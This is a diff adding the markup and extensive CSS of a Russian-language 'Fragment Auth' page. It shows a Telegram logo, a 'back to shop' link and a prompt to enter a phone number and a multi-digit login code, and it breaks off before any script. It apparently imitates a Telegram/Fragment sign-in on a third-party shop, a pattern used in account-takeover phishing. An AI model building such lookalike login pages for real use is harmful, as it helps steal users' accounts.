@@ -1,0 +1,1976 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Fragment Auth</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            /* Enhanced color palette - более современная и контрастная */
+            --bg-color: #0a0e17;
+            --bg-secondary: #1a2232;
+            --accent-color: #3b82f6;
+            --accent-hover: #2563eb;
+            --accent-light: #60a5fa;
+            --accent-glow: rgba(59, 130, 246, 0.5);
+            --accent-glow-strong: rgba(59, 130, 246, 0.8);
+            --card-bg: rgba(26, 34, 50, 0.85);
+            --card-border: rgba(255, 255, 255, 0.12);
+            --text-main: #ffffff;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+            --error-color: #ef4444;
+            --error-glow: rgba(239, 68, 68, 0.3);
+            --input-bg: rgba(15, 23, 42, 0.6);
+            --input-border: rgba(255, 255, 255, 0.12);
+            --input-focus-border: rgba(59, 130, 246, 0.6);
+            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.3);
+            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.4);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
+            --shadow-xl: 0 20px 25px -5px rgba(0, 0, 0, 0.6);
+            --shadow-glow: 0 0 30px rgba(59, 130, 246, 0.3);
+            --gradient-accent: linear-gradient(135deg, #3b82f6 0%, #2563eb 50%, #1d4ed8 100%);
+            --gradient-card: linear-gradient(145deg, rgba(26, 34, 50, 0.9) 0%, rgba(15, 23, 42, 0.8) 100%);
+        }
+
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body {
+            background: radial-gradient(ellipse at top, #1a2232 0%, #0a0e17 50%, #0a0e17 100%);
+            background-attachment: fixed;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-main);
+            overflow: hidden;
+            position: relative;
+            letter-spacing: -0.01em;
+        }
+
+        /* Animated starry background */
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            overflow: hidden;
+        }
+
+        .star-bg {
+            position: absolute;
+            background: #ffffff;
+            border-radius: 50%;
+            animation: twinkle 4s infinite linear;
+        }
+
+        .star-bg:nth-child(odd) {
+            animation-duration: 3s;
+            animation-delay: 1s;
+        }
+
+        .star-bg:nth-child(3n) {
+            animation-duration: 5s;
+            animation-delay: 2s;
+        }
+
+        .star-bg:nth-child(4n) {
+            animation-duration: 6s;
+            animation-delay: 0.5s;
+        }
+
+        .star-bg:nth-child(5n) {
+            animation-duration: 4.5s;
+            animation-delay: 1.5s;
+        }
+
+        @keyframes twinkle {
+            0%, 100% {
+                opacity: 0.1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.6;
+                transform: scale(1.2);
+            }
+        }
+
+        .background-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+            filter: blur(8px);
+            pointer-events: none;
+        }
+
+        /* Additional gradient overlay */
+        .gradient-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg,
+                rgba(51, 144, 236, 0.05) 0%,
+                rgba(59, 130, 246, 0.03) 25%,
+                rgba(96, 165, 250, 0.02) 50%,
+                rgba(147, 197, 253, 0.03) 75%,
+                rgba(51, 144, 236, 0.05) 100%);
+            background-size: 400% 400%;
+            animation: gradient-shift 15s ease infinite;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        @keyframes gradient-shift {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+
+
+        .auth-card {
+            background: var(--gradient-card);
+            backdrop-filter: blur(24px) saturate(180%);
+            -webkit-backdrop-filter: blur(24px) saturate(180%);
+            border: 1px solid var(--card-border);
+            border-radius: 28px;
+            padding: 40px 32px;
+            width: 95%;
+            max-width: 480px;
+            text-align: center;
+            box-shadow: var(--shadow-xl), 
+                        0 0 0 1px rgba(255, 255, 255, 0.05) inset,
+                        var(--shadow-glow);
+            position: relative;
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), 
+                        box-shadow 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .auth-card::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: 28px;
+            padding: 1px;
+            background: linear-gradient(135deg, 
+                rgba(59, 130, 246, 0.2) 0%, 
+                rgba(59, 130, 246, 0) 50%,
+                rgba(96, 165, 250, 0.1) 100%);
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .auth-card:hover::before {
+            opacity: 1;
+        }
+
+        .logo {
+            width: 80px; 
+            height: 80px; 
+            background: var(--gradient-accent);
+            border-radius: 22px; 
+            margin: 0 auto 28px;
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.4), 
+                        0 0 40px rgba(59, 130, 246, 0.2);
+            position: relative;
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),
+                        box-shadow 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .logo::after {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            border-radius: 24px;
+            background: var(--gradient-accent);
+            opacity: 0.3;
+            filter: blur(12px);
+            z-index: -1;
+            transition: opacity 0.3s ease;
+        }
+
+        .logo:hover {
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 12px 32px rgba(59, 130, 246, 0.5), 
+                        0 0 50px rgba(59, 130, 246, 0.3);
+        }
+
+        h1 { 
+            font-size: 26px; 
+            font-weight: 700;
+            margin-bottom: 12px; 
+            letter-spacing: -0.02em;
+            background: linear-gradient(135deg, #ffffff 0%, #e2e8f0 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        p { 
+            color: var(--text-secondary); 
+            font-size: 15px; 
+            margin-bottom: 32px; 
+            line-height: 1.6;
+            font-weight: 400;
+            letter-spacing: 0.01em;
+        }
+
+        .input-group {
+            display: none;
+            animation: slideInUp 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            opacity: 0;
+        }
+        .input-group.active {
+            display: block;
+            opacity: 1;
+        }
+
+        .phone-input {
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .phone-display {
+            width: 100%;
+            background: var(--input-bg);
+            border: 1.5px solid var(--input-border);
+            border-radius: 16px;
+            padding: 18px 8px;
+            color: var(--text-main) !important;
+            font-size: 18px;
+            font-weight: 600;
+            text-align: center;
+            outline: none;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            letter-spacing: 1.5px;
+            font-family: 'JetBrains Mono', 'Courier New', 'Monaco', 'Consolas', monospace;
+            min-height: 20px;
+            line-height: 1.3;
+        }
+
+        .phone-display:focus {
+            border-color: var(--input-focus-border);
+            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15),
+                        inset 0 0 0 1px rgba(59, 130, 246, 0.1);
+            background: rgba(15, 23, 42, 0.8);
+            transform: translateY(-1px);
+        }
+        
+        .phone-display:hover:not(:focus) {
+            border-color: rgba(255, 255, 255, 0.2);
+            background: rgba(15, 23, 42, 0.7);
+        }
+
+        .flag-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 24px;
+            height: 18px;
+            border-radius: 2px;
+            background: linear-gradient(45deg, #ff0000, #ffffff, #0000ff);
+        }
+
+        .phone-parts {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .phone-part {
+            background: var(--input-bg);
+            border: 1.5px solid var(--input-border);
+            border-radius: 14px;
+            padding: 14px 10px;
+            color: var(--text-main);
+            font-size: 18px;
+            font-weight: 600;
+            text-align: center;
+            min-width: 44px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            outline: none;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
+        }
+
+        .phone-part:focus {
+            border-color: var(--input-focus-border);
+            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15),
+                        inset 0 0 0 1px rgba(59, 130, 246, 0.1);
+            transform: scale(1.06) translateY(-1px);
+            background: rgba(15, 23, 42, 0.8);
+        }
+        
+        .phone-part:hover:not(:focus) {
+            border-color: rgba(255, 255, 255, 0.2);
+            background: rgba(15, 23, 42, 0.7);
+        }
+
+        .phone-part.animate {
+            animation: bounceIn 0.6s ease-out;
+        }
+
+        .code-input {
+            display: flex !important;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+            min-height: 60px;
+            padding: 12px;
+            border: 1.5px solid var(--input-border);
+            border-radius: 16px;
+            background: rgba(15, 23, 42, 0.4);
+            backdrop-filter: blur(10px);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .code-input:has(.code-digit:focus) {
+            border-color: var(--input-focus-border);
+            background: rgba(15, 23, 42, 0.6);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+
+        .code-digit {
+            width: 52px;
+            height: 60px;
+            background: var(--input-bg);
+            border: 2px solid var(--input-border);
+            border-radius: 14px;
+            color: var(--text-main) !important;
+            font-size: 30px;
+            font-weight: 700;
+            text-align: center;
+            outline: none;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            font-family: 'JetBrains Mono', 'Courier New', 'Monaco', 'Consolas', monospace;
+            display: flex !important;
+            align-items: center;
+            justify-content: center;
+            line-height: 1;
+            padding: 0;
+            margin: 0;
+        }
+
+        .code-digit:focus {
+            border-color: var(--input-focus-border);
+            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.2),
+                        0 4px 12px rgba(59, 130, 246, 0.3);
+            transform: scale(1.08) translateY(-2px);
+            background: rgba(15, 23, 42, 0.9);
+        }
+        
+        .code-digit:hover:not(:focus):not(.filled) {
+            border-color: rgba(255, 255, 255, 0.25);
+            background: rgba(15, 23, 42, 0.7);
+        }
+
+        .code-digit.filled {
+            border-color: var(--accent-color);
+            background: linear-gradient(135deg, rgba(59, 130, 246, 0.15) 0%, rgba(59, 130, 246, 0.08) 100%);
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2),
+                        inset 0 1px 2px rgba(59, 130, 246, 0.1);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 5px;
+            background: rgba(255,255,255,0.08);
+            border-radius: 10px;
+            margin-bottom: 24px;
+            overflow: hidden;
+            position: relative;
+            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.3);
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--gradient-accent);
+            border-radius: 10px;
+            transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+            width: 0%;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 0 12px rgba(59, 130, 246, 0.5),
+                        inset 0 1px 0 rgba(255, 255, 255, 0.2);
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background: linear-gradient(90deg, 
+                transparent 0%, 
+                rgba(255, 255, 255, 0.3) 50%, 
+                transparent 100%);
+            animation: shimmer-progress 2s infinite;
+        }
+
+        @keyframes shimmer-progress {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        input {
+            width: 100%; 
+            background: var(--input-bg); 
+            border: 1.5px solid var(--input-border);
+            border-radius: 16px; 
+            padding: 16px 18px; 
+            color: var(--text-main); 
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 20px; 
+            outline: none; 
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            letter-spacing: 0.01em;
+        }
+        
+        input::placeholder {
+            color: var(--text-muted);
+            font-weight: 400;
+        }
+        
+        input:focus { 
+            border-color: var(--input-focus-border); 
+            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15),
+                        inset 0 0 0 1px rgba(59, 130, 246, 0.1);
+            background: rgba(15, 23, 42, 0.8);
+            transform: translateY(-1px);
+        }
+        
+        input:hover:not(:focus) {
+            border-color: rgba(255, 255, 255, 0.2);
+            background: rgba(15, 23, 42, 0.7);
+        }
+
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(40px) scale(0.96);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        @keyframes bounceIn {
+            0% { 
+                transform: scale(0.4) translateY(10px); 
+                opacity: 0; 
+            }
+            50% { 
+                transform: scale(1.05) translateY(-2px); 
+            }
+            70% { 
+                transform: scale(0.95) translateY(0px); 
+            }
+            100% { 
+                transform: scale(1) translateY(0); 
+                opacity: 1; 
+            }
+        }
+
+        @keyframes fadeInGlow {
+            from { box-shadow: 0 0 0 0 rgba(51, 144, 236, 0.7); }
+            to { box-shadow: 0 0 0 10px rgba(51, 144, 236, 0); }
+        }
+
+        button {
+            position: relative;
+            width: 100%; 
+            background: var(--gradient-accent); 
+            color: #fff; 
+            border: none;
+            border-radius: 16px; 
+            padding: 16px 32px; 
+            font-size: 16px; 
+            font-weight: 600;
+            cursor: pointer; 
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3),
+                        0 0 0 0 rgba(59, 130, 246, 0);
+            overflow: hidden;
+            letter-spacing: 0.01em;
+        }
+        
+        button::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(255,255,255,0.2) 0%, transparent 100%);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        button:hover {
+            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.4),
+                        0 0 0 4px rgba(59, 130, 246, 0.1);
+            transform: translateY(-2px);
+        }
+        
+        button:hover::before {
+            opacity: 1;
+        }
+        
+        button:active {
+            transform: translateY(0px) scale(0.98);
+            box-shadow: 0 2px 8px rgba(59, 130, 246, 0.3),
+                        0 0 0 2px rgba(59, 130, 246, 0.1);
+        }
+        
+        button:disabled { 
+            opacity: 0.5; 
+            cursor: not-allowed; 
+            transform: none !important;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2) !important;
+        }
+        
+        /* Ripple effect */
+        button .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.6);
+            transform: scale(0);
+            animation: ripple-animation 0.6s ease-out;
+            pointer-events: none;
+        }
+        
+        @keyframes ripple-animation {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
+
+        .star {
+            position: absolute;
+            width: 0;
+            height: auto;
+            filter: drop-shadow(0 0 0 #fffdef);
+            z-index: -1;
+            transition: all 0.5s cubic-bezier(0.05, 0.83, 0.43, 0.96);
+            animation: twinkle 1.5s infinite ease-in-out;
+        }
+
+        button:hover .star-1 {
+            top: -80%;
+            left: -30%;
+            width: 25px;
+            filter: drop-shadow(0 0 15px #fffdef);
+            transform: rotate(0deg);
+        }
+
+        button:hover .star-2 {
+            top: -25%;
+            left: 10%;
+            width: 15px;
+            filter: drop-shadow(0 0 15px #fffdef);
+            transform: rotate(60deg);
+        }
+
+        button:hover .star-3 {
+            top: 55%;
+            left: 25%;
+            width: 5px;
+            filter: drop-shadow(0 0 15px #fffdef);
+            transform: rotate(120deg);
+        }
+
+        button:hover .star-4 {
+            top: 30%;
+            left: 80%;
+            width: 8px;
+            filter: drop-shadow(0 0 15px #fffdef);
+            transform: rotate(180deg);
+        }
+
+        button:hover .star-5 {
+            top: 25%;
+            left: 115%;
+            width: 15px;
+            filter: drop-shadow(0 0 15px #fffdef);
+            transform: rotate(240deg);
+        }
+
+        button:hover .star-6 {
+            top: 5%;
+            left: 60%;
+            width: 5px;
+            filter: drop-shadow(0 0 15px #fffdef);
+            transform: rotate(300deg);
+        }
+
+        .star-1 { animation-delay: 0s; }
+        .star-2 { animation-delay: 0.2s; }
+        .star-3 { animation-delay: 0.4s; }
+        .star-4 { animation-delay: 0.6s; }
+        .star-5 { animation-delay: 0.8s; }
+        .star-6 { animation-delay: 1.0s; }
+
+        @keyframes twinkle {
+            0%, 100% {
+                opacity: 1;
+                transform: scale(1) rotate(0deg);
+            }
+            50% {
+                opacity: 0.6;
+                transform: scale(1.1) rotate(180deg);
+            }
+        }
+
+        .fil0 {
+            fill: #fffdef;
+        }
+
+        .error-msg { 
+            color: var(--error-color); 
+            font-size: 14px; 
+            font-weight: 500;
+            margin-top: 16px; 
+            display: none;
+            padding: 12px 16px;
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            border-radius: 12px;
+            animation: slideInUp 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            line-height: 1.5;
+        }
+
+        .spinner {
+            width: 20px; 
+            height: 20px; 
+            border: 2.5px solid rgba(255,255,255,0.25);
+            border-top-color: #fff; 
+            border-radius: 50%; 
+            animation: spin 0.8s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+            display: none; 
+            margin-right: 12px;
+        }
+        button.loading .spinner { display: block; }
+        @keyframes spin { 
+            to { transform: rotate(360deg); } 
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+        .shake {
+            animation: shake 0.5s ease-in-out;
+        }
+        .error-input {
+            border-color: var(--error-color) !important;
+            box-shadow: 0 0 0 4px var(--error-glow),
+                        inset 0 0 0 1px rgba(239, 68, 68, 0.1) !important;
+            background: rgba(239, 68, 68, 0.05) !important;
+        }
+
+        /* Beautiful animated button background */
+        .service-button {
+            position: relative;
+            overflow: hidden;
+            background: linear-gradient(135deg, 
+                rgba(59, 130, 246, 0.1) 0%, 
+                rgba(59, 130, 246, 0.08) 50%,
+                rgba(96, 165, 250, 0.1) 100%);
+            border: 1.5px solid rgba(59, 130, 246, 0.3);
+            backdrop-filter: blur(24px) saturate(180%);
+            -webkit-backdrop-filter: blur(24px) saturate(180%);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            margin-top: 28px;
+            width: 100%;
+            padding: 16px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            border-radius: 16px;
+            color: var(--text-main);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2),
+                        0 0 0 0 rgba(59, 130, 246, 0);
+        }
+
+        .service-button::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg,
+                transparent 30%,
+                rgba(59, 130, 246, 0.1) 40%,
+                rgba(96, 165, 250, 0.15) 50%,
+                rgba(59, 130, 246, 0.1) 60%,
+                transparent 70%);
+            animation: shimmer-bg 3s ease-in-out infinite;
+            border-radius: 14px;
+            filter: blur(1px);
+        }
+
+        .service-button::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 20% 20%, rgba(59, 130, 246, 0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 80%, rgba(96, 165, 250, 0.08) 0%, transparent 50%),
+                        radial-gradient(circle at 40% 60%, rgba(147, 197, 253, 0.06) 0%, transparent 50%);
+            animation: pulse-bg 4s ease-in-out infinite alternate;
+            border-radius: 14px;
+        }
+
+        @keyframes shimmer-bg {
+            0%, 100% {
+                transform: translate(-50%, -50%) rotate(0deg);
+                opacity: 0.3;
+            }
+            50% {
+                transform: translate(-50%, -50%) rotate(180deg);
+                opacity: 0.6;
+            }
+        }
+
+        @keyframes pulse-bg {
+            0% {
+                opacity: 0.4;
+                filter: blur(0.5px);
+            }
+            100% {
+                opacity: 0.8;
+                filter: blur(1px);
+            }
+        }
+
+        .service-button:hover {
+            border-color: rgba(59, 130, 246, 0.5);
+            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.2),
+                        0 0 0 3px rgba(59, 130, 246, 0.1);
+            transform: translateY(-3px);
+            background: linear-gradient(135deg, 
+                rgba(59, 130, 246, 0.15) 0%, 
+                rgba(59, 130, 246, 0.12) 50%,
+                rgba(96, 165, 250, 0.15) 100%);
+        }
+
+        .service-button:hover::before {
+            animation-duration: 1.2s;
+            opacity: 1;
+        }
+        
+        .service-button:active {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.15);
+        }
+
+        .service-button .button-content {
+            position: relative;
+            z-index: 2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        /* Floating particles */
+        .floating-particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(59, 130, 246, 0.6);
+            border-radius: 50%;
+            pointer-events: none;
+            animation: float-particle 6s ease-in-out infinite;
+        }
+
+        .floating-particle:nth-child(1) {
+            top: 20%;
+            left: 20%;
+            animation-delay: 0s;
+        }
+
+        .floating-particle:nth-child(2) {
+            top: 60%;
+            left: 70%;
+            animation-delay: 1.5s;
+            width: 3px;
+            height: 3px;
+        }
+
+        .floating-particle:nth-child(3) {
+            top: 40%;
+            left: 85%;
+            animation-delay: 3s;
+            width: 5px;
+            height: 5px;
+            background: rgba(96, 165, 250, 0.5);
+        }
+
+        .floating-particle:nth-child(4) {
+            top: 80%;
+            left: 15%;
+            animation-delay: 4.5s;
+            width: 2px;
+            height: 2px;
+        }
+
+        .floating-particle:nth-child(5) {
+            top: 30%;
+            left: 50%;
+            animation-delay: 2s;
+            width: 3px;
+            height: 3px;
+            background: rgba(147, 197, 253, 0.7);
+        }
+
+        @keyframes float-particle {
+            0%, 100% {
+                transform: translateY(0px) scale(1);
+                opacity: 0.3;
+            }
+            25% {
+                transform: translateY(-10px) scale(1.2);
+                opacity: 0.6;
+            }
+            50% {
+                transform: translateY(-5px) scale(0.8);
+                opacity: 0.8;
+            }
+            75% {
+                transform: translateY(-15px) scale(1.1);
+                opacity: 0.5;
+            }
+        }
+        
+        /* Back button styles */
+        .back-step-button {
+            position: relative;
+            width: 100%;
+            background: transparent;
+            color: var(--text-secondary);
+            border: 1.5px solid var(--input-border);
+            border-radius: 14px;
+            padding: 12px 24px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 16px;
+            letter-spacing: 0.01em;
+        }
+        
+        .back-step-button:hover {
+            background: rgba(59, 130, 246, 0.1);
+            border-color: var(--accent-color);
+            color: var(--accent-color);
+            transform: translateY(-1px);
+        }
+        
+        .back-step-button:active {
+            transform: translateY(0px);
+        }
+        
+        .back-step-button svg {
+            width: 18px;
+            height: 18px;
+            transition: transform 0.3s ease;
+        }
+        
+        .back-step-button:hover svg {
+            transform: translateX(-2px);
+        }
+        
+        /* Arrow animation styles */
+        .arrow-svg {
+            position: relative;
+            overflow: visible;
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .arrow-line {
+            transition: filter 0.3s ease;
+            filter: drop-shadow(0 0 6px rgba(59, 130, 246, 0.8));
+        }
+        
+        .arrow-head {
+            transition: transform 0.3s ease, filter 0.3s ease;
+            transform-origin: 72px 15px;
+            filter: drop-shadow(0 0 8px rgba(59, 130, 246, 0.9));
+        }
+        
+        /* Smooth sliding animation for arrow */
+        .arrow-svg {
+            animation: arrow-slide 2.5s ease-in-out infinite;
+        }
+        
+        @keyframes arrow-slide {
+            0%, 100% {
+                transform: translateX(0);
+            }
+            50% {
+                transform: translateX(4px);
+            }
+        }
+        
+        /* Glow pulse on arrow */
+        .arrow-line,
+        .arrow-head {
+            animation: arrow-glow 2s ease-in-out infinite;
+        }
+        
+        @keyframes arrow-glow {
+            0%, 100% {
+                filter: drop-shadow(0 0 8px rgba(59, 130, 246, 0.8));
+                opacity: 1;
+            }
+            50% {
+                filter: drop-shadow(0 0 12px rgba(59, 130, 246, 1));
+                opacity: 1;
+            }
+        }
+        
+        /* Hover effect */
+        .auth-card:hover .arrow-svg {
+            transform: translateX(3px);
+        }
+        
+        .auth-card:hover .arrow-line,
+        .auth-card:hover .arrow-head {
+            filter: drop-shadow(0 0 15px rgba(59, 130, 246, 1));
+            animation-duration: 1s;
+        }
+
+        /* Кнопка "Назад в магазин" */
+/* Кнопка "Назад в магазин" - фиксированная позиция */
+.back-to-shop-btn {
+    position: fixed;
+    top: 20px;
+    left: 20px;
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 10px 16px;
+    background: rgba(26, 34, 50, 0.8);
+    border: 1px solid rgba(255, 255, 255, 0.15);
+    border-radius: 16px;
+    color: var(--text-secondary);
+    font-size: 14px;
+    font-weight: 500;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    cursor: pointer;
+    text-decoration: none;
+    z-index: 1000;
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3),
+                0 0 0 1px rgba(255, 255, 255, 0.05) inset;
+}
+
+.back-to-shop-btn:hover {
+    color: var(--text-main);
+    background: rgba(26, 34, 50, 0.95);
+    border-color: rgba(59, 130, 246, 0.5);
+    transform: translateX(-4px) translateY(-2px);
+    box-shadow: 0 8px 20px rgba(59, 130, 246, 0.25),
+                0 0 0 2px rgba(59, 130, 246, 0.2) inset;
+}
+
+.back-to-shop-btn:active {
+    transform: translateX(-2px) translateY(0px);
+    box-shadow: 0 2px 8px rgba(59, 130, 246, 0.15),
+                0 0 0 1px rgba(59, 130, 246, 0.1) inset;
+}
+
+.back-to-shop-btn svg {
+    width: 18px;
+    height: 18px;
+    opacity: 0.9;
+    transition: transform 0.3s ease;
+    filter: drop-shadow(0 0 4px rgba(59, 130, 246, 0.3));
+}
+
+.back-to-shop-btn:hover svg {
+    transform: translateX(-2px) scale(1.1);
+    filter: drop-shadow(0 0 8px rgba(59, 130, 246, 0.8));
+}
+
+/* Мобильная адаптация */
+@media (max-width: 480px) {
+    .back-to-shop-btn {
+        top: 15px;
+        left: 15px;
+        padding: 8px 12px;
+        font-size: 13px;
+        border-radius: 14px;
+    }
+}
+
+@media (max-width: 360px) {
+    .back-to-shop-btn {
+        top: 10px;
+        left: 10px;
+        padding: 6px 10px;
+        font-size: 12px;
+    }
+}
+    </style>
+</head>
+<body>
+    <div class="back-to-shop-btn" onclick="window.location.href='index.html' + window.location.search">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M19 12H5M12 19l-7-7 7-7"/>
+        </svg>
+        <span>Назад в магазин</span>
+    </div>
+    <div class="stars">
+        <!-- Generate stars dynamically -->
+    </div>
+    <div class="gradient-overlay"></div>
+    <video class="background-video" autoplay muted loop>
+        <source src="https://drive.google.com/uc?export=download&id=1E7ThtTfnYRX5A_rhKElELt2zpFAALw48" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+<div class="auth-card">
+    <table style="margin: 0 auto 24px; border-collapse: collapse;">
+        <tr>
+            <td style="width: 72px; height: 72px; text-align: center; vertical-align: middle; padding: 0 10px;">
+                <img src="https://i.ibb.co/fYmn1fxP/telegram-logo-icon-social-media-icon-free-png.webp" alt="Telegram Logo" style="width: 72px; height: 72px; border-radius: 12px; object-fit: cover;">
+            </td>
+            <td style="width: 90px; height: 72px; text-align: center; vertical-align: middle; padding: 0 10px;">
+                <svg width="80" height="30" viewBox="0 0 80 30" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin: 21px 0;" class="arrow-svg">
+                    <defs>
+                        <linearGradient id="arrowGradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                            <stop offset="0%" style="stop-color:#3b82f6;stop-opacity:1" />
+                            <stop offset="100%" style="stop-color:#60a5fa;stop-opacity:1" />
+                        </linearGradient>
+                    </defs>
+                    <path d="M8 15 L60 15" stroke="#3b82f6" stroke-width="4" stroke-linecap="round" class="arrow-line"/>
+                    <polygon points="60,8 72,15 60,22" fill="#3b82f6" class="arrow-head"/>
+                </svg>
+            </td>
+            <td style="width: 72px; height: 72px; text-align: center; vertical-align: middle; padding: 0 10px;">
+                <img src="https://i.ibb.co/mfX9wT4/orig.webp" alt="Feature Image" style="width: 72px; height: 72px; border-radius: 12px; object-fit: cover; border: 2px solid rgba(51, 144, 236, 0.3);">
+            </td>
+        </tr>
+    </table>
+    
+    <h1 id="title">Авторизация</h1>
+    <p id="desc">Введите номер телефона для входа через Fragment</p>
+
+    <div id="step-phone" class="input-group active">
